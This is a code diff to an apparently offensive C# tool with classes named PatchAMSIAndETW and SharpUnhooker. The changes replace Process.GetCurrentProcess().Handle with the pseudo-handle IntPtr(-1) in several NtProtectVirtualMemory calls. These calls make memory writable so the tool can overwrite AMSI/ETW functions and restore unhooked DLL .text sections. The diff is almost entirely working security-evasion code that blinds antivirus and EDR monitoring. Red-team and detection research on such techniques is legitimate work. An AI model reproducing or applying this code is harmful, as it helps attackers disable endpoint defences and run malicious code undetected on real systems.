@@ -904,11 +904,12 @@ public class PatchAMSIAndETW {
 
 	private static void PatchMem(byte[] patch, string library, string function) {
 		try {
+            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
 			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
 			IntPtr funcPtr = GetExportAddress(libPtr, function);
             IntPtr patchLength = new IntPtr(patch.Length);
             UInt32 oldProtect = 0;
-            DInvokeCore.NtProtectVirtualMemory((Process.GetCurrentProcess().Handle), ref funcPtr, ref patchLength, 0x40, ref oldProtect);
+            DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchLength, 0x40, ref oldProtect);
 			Marshal.Copy(patch, 0, funcPtr, patch.Length);
 		}catch (Exception e) {
 			Console.WriteLine(" [!] {0}", e.Message);
@@ -954,6 +955,7 @@ public class SharpUnhooker {
 
     public static void Unhooker(string DLLname) {
     	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
+        IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
     	// get original .text section from original DLL
     	string DLLFullPath;
     	try {
@@ -988,7 +990,7 @@ public class SharpUnhooker {
 						Console.WriteLine("Updating memory protection setting...");
 						UInt32 oldProtect = 0;
                         IntPtr assemblyBytesLength = new IntPtr(assemblyBytes.Length);
-                        bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory((Process.GetCurrentProcess().Handle), ref InMemorySectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
+                        bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
                         if (updateMemoryProtection) {
                             Console.WriteLine("Yay!Memory protection setting updated!");
                             Console.WriteLine("Applying patch...");
@@ -1000,7 +1002,7 @@ public class SharpUnhooker {
                             Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
                             bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
                             UInt32 newProtect = 0;
-                            DInvokeCore.NtProtectVirtualMemory((Process.GetCurrentProcess().Handle), ref InMemorySectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
+                            DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
                             if (!checkAssemblyBytesAfterPatched) {
                                 Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
                             }else {
@@ -1021,6 +1023,7 @@ public class SharpUnhooker {
 
     public static void SilentUnhooker(string DLLname) {
     	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
+        IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
     	// get original .text section from original DLL
     	string DLLFullPath;
 		try {
@@ -1047,7 +1050,7 @@ public class SharpUnhooker {
 						IntPtr InMemorySectionPointer = ModuleHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
 		    			UInt32 oldProtect = 0;
                         IntPtr assemblyBytesLength = new IntPtr(assemblyBytes.Length);
-                        bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory((Process.GetCurrentProcess().Handle), ref InMemorySectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
+                        bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
                         if (updateMemoryProtection) {
                             Marshal.Copy(assemblyBytes, 0, InMemorySectionPointer, assemblyBytes.Length);
                             byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
@@ -1055,7 +1058,7 @@ public class SharpUnhooker {
                             Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
                             bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
                             UInt32 newProtect = 0;
-                            DInvokeCore.NtProtectVirtualMemory((Process.GetCurrentProcess().Handle), ref InMemorySectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
+                            DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemorySectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
                             if (!checkAssemblyBytesAfterPatched) {
                                 Console.WriteLine("[-] Patched API Bytes Doesnt Match With Desired API Bytes! API Is Probably Still Hooked! [-]");
                             }else {
